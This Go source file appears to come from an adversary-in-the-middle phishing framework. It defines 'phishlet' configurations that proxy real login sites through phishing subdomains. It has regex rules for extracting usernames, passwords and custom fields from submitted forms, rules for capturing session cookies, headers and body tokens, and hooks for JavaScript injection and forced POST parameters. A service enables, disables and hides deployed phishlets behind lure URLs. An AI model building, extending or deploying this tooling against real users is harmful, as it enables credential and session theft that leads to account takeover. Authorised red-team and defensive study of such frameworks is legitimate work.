package aitm

import (
	"fmt"
	"regexp"
	"strings"
	"sync"
)

// PhishletStore is the persistence interface required by PhishletService.
type PhishletStore interface {
	GetPhishletDeployment(name string) (*PhishletDeployment, error)
	SetPhishletDeployment(deployment *PhishletDeployment) error
	ListPhishletDeployments() ([]*PhishletDeployment, error)
	DeletePhishletDeployment(name string) error
}

// PhishletDef is the compiled, fully-resolved form of a phishlet YAML file.
// All regex fields are pre-compiled.
type PhishletDef struct {
	Name        string
	Author      string
	Version     string
	ProxyHosts  []ProxyHost
	SubFilters  []SubFilter
	AuthTokens  []TokenRule
	Credentials CredentialRules
	Login       LoginSpec
	ForcePosts  []ForcePost
	Intercepts  []InterceptRule
	JSInjects   []JSInject
	AuthURLs    []*regexp.Regexp
}

func (p *PhishletDef) MatchesHost(hostname, baseDomain string) bool {
	for _, host := range p.ProxyHosts {
		if hostname == host.PhishSubdomain+"."+baseDomain {
			return true
		}
	}
	return false
}

func (p *PhishletDef) FindLanding() *ProxyHost {
	for i := range p.ProxyHosts {
		if p.ProxyHosts[i].IsLanding {
			return &p.ProxyHosts[i]
		}
	}
	return nil
}

func (p *PhishletDef) MatchesAuthURL(rawURL string) bool {
	for _, authURL := range p.AuthURLs {
		if authURL.MatchString(rawURL) {
			return true
		}
	}
	return false
}

// PhishletDeployment is the operator's runtime state for a phishlet stored in
// the database: the hostname it answers on, whether it is enabled/hidden, and
// which DNS provider manages its records. Separate from PhishletDef (the static
// YAML definition).
type PhishletDeployment struct {
	Name        string
	BaseDomain  string
	DNSProvider string
	Hostname    string
	UnauthURL   string
	SpoofURL    string
	Enabled     bool
	Hidden      bool
}

// ProxyHost maps a phishing subdomain to a real upstream host.
type ProxyHost struct {
	PhishSubdomain string
	OrigSubdomain  string
	Domain         string
	IsLanding      bool
	IsSession      bool
	AutoFilter     bool
}

// SubFilter is a compiled search/replace rule applied to proxied response bodies.
type SubFilter struct {
	Hostname  string
	MimeTypes []string
	Search    *regexp.Regexp
	Replace   string
}

func (s *SubFilter) MatchesMIME(mimeType string) bool {
	for _, mime := range s.MimeTypes {
		if strings.HasPrefix(mimeType, mime) {
			return true
		}
	}
	return false
}

// TokenType classifies how an auth token is extracted.
type TokenType int

const (
	TokenTypeCookie TokenType = iota
	TokenTypeBody
	TokenTypeHTTPHeader
)

// TokenRule describes how to capture one auth token from a response.
type TokenRule struct {
	Type     TokenType
	Domain   string
	Path     *regexp.Regexp
	Name     *regexp.Regexp
	Search   *regexp.Regexp
	HTTPOnly bool
	Always   bool
}

// CredentialRules groups the extraction rules for username, password, and custom fields.
type CredentialRules struct {
	Username CredentialRule
	Password CredentialRule
	Custom   []CustomCredentialRule
}

// CredentialRule is a key+search regex pair that extracts one field from POST/JSON.
type CredentialRule struct {
	Key    *regexp.Regexp
	Search *regexp.Regexp
	Type   string // "post" or "json"
}

// CustomCredentialRule is like CredentialRule but stores into Session.Custom[Name].
type CustomCredentialRule struct {
	Name string
	CredentialRule
}

// LoginSpec identifies where the login form lives.
type LoginSpec struct {
	Domain string
	Path   string
}

// ForcePost describes a POST parameter to inject or override.
type ForcePost struct {
	Path       *regexp.Regexp
	Conditions []ForcePostCondition
	Params     []ForcePostParam
}

type ForcePostCondition struct {
	Key    *regexp.Regexp
	Search *regexp.Regexp
}

type ForcePostParam struct {
	Key   string
	Value string
}

// InterceptRule matches a request and returns a fully custom response.
type InterceptRule struct {
	Path        *regexp.Regexp
	BodySearch  *regexp.Regexp
	StatusCode  int
	ContentType string
	Body        string
}

// JSInject defines a JavaScript snippet to inject into matching pages.
type JSInject struct {
	TriggerDomain string
	TriggerPath   *regexp.Regexp
	Script        string
}

// PhishletService owns all business logic for phishlet lifecycle.
// It is the single point of truth for which phishlets are active: every
// enable/disable writes to the store AND updates the in-memory hostname set,
// so the proxy router never falls out of sync with the database.
type PhishletService struct {
	store           PhishletStore
	bus             EventBus
	dns             *DNSService
	activeHostnames sync.Map // hostname (lowercase) → struct{}
}

func NewPhishletService(store PhishletStore, bus EventBus, dns *DNSService) *PhishletService {
	return &PhishletService{store: store, bus: bus, dns: dns}
}

// LoadActiveFromDB populates the in-memory hostname set from the database.
// Call once during startup, before the proxy begins accepting connections.
func (s *PhishletService) LoadActiveFromDB() error {
	deployments, err := s.store.ListPhishletDeployments()
	if err != nil {
		return fmt.Errorf("loading active phishlets: %w", err)
	}
	for _, deployment := range deployments {
		if deployment.Enabled && deployment.Hostname != "" {
			s.activeHostnames.Store(strings.ToLower(deployment.Hostname), struct{}{})
		}
	}
	return nil
}

// Contains reports whether hostname is currently proxied by an active phishlet.
// Satisfies proxy.HostnameSet so PhishletService can be passed directly to PhishletRouter.
func (s *PhishletService) Contains(hostname string) bool {
	_, ok := s.activeHostnames.Load(strings.ToLower(hostname))
	return ok
}

// Enable marks a phishlet as active, optionally updating its hostname, base
// domain, and DNS provider. The in-memory hostname set is updated atomically
// so routing takes effect immediately without a restart.
func (s *PhishletService) Enable(name, hostname, baseDomain, dnsProvider string) (*PhishletDeployment, error) {
	deployment, err := s.store.GetPhishletDeployment(name)
	if err != nil {
		deployment = &PhishletDeployment{Name: name}
	}
	if hostname != "" {
		deployment.Hostname = hostname
	}
	if baseDomain != "" {
		deployment.BaseDomain = baseDomain
	}
	if dnsProvider != "" {
		deployment.DNSProvider = dnsProvider
	}
	if deployment.Hostname == "" {
		return nil, fmt.Errorf("hostname: required")
	}
	deployment.Enabled = true
	if err := s.store.SetPhishletDeployment(deployment); err != nil {
		return nil, err
	}
	s.activeHostnames.Store(strings.ToLower(deployment.Hostname), struct{}{})
	return deployment, nil
}

// Disable marks a phishlet as inactive and removes it from the hostname set.
func (s *PhishletService) Disable(name string) (*PhishletDeployment, error) {
	deployment, err := s.store.GetPhishletDeployment(name)
	if err != nil {
		return nil, err
	}
	deployment.Enabled = false
	if err := s.store.SetPhishletDeployment(deployment); err != nil {
		return nil, err
	}
	if deployment.Hostname != "" {
		s.activeHostnames.Delete(strings.ToLower(deployment.Hostname))
	}
	return deployment, nil
}

// Hide marks a phishlet as hidden (suppressed from lure URL generation).
// Does not affect routing — the phishlet keeps intercepting traffic.
func (s *PhishletService) Hide(name string) (*PhishletDeployment, error) {
	deployment, err := s.store.GetPhishletDeployment(name)
	if err != nil {
		return nil, err
	}
	deployment.Hidden = true
	if err := s.store.SetPhishletDeployment(deployment); err != nil {
		return nil, err
	}
	return deployment, nil
}

// Unhide reverses Hide.
func (s *PhishletService) Unhide(name string) (*PhishletDeployment, error) {
	deployment, err := s.store.GetPhishletDeployment(name)
	if err != nil {
		return nil, err
	}
	deployment.Hidden = false
	if err := s.store.SetPhishletDeployment(deployment); err != nil {
		return nil, err
	}
	return deployment, nil
}

// GetDeployment returns the stored deployment for a phishlet by name.
func (s *PhishletService) GetDeployment(name string) (*PhishletDeployment, error) {
	return s.store.GetPhishletDeployment(name)
}

// ListDeployments returns all stored phishlet deployments.
func (s *PhishletService) ListDeployments() ([]*PhishletDeployment, error) {
	return s.store.ListPhishletDeployments()
}
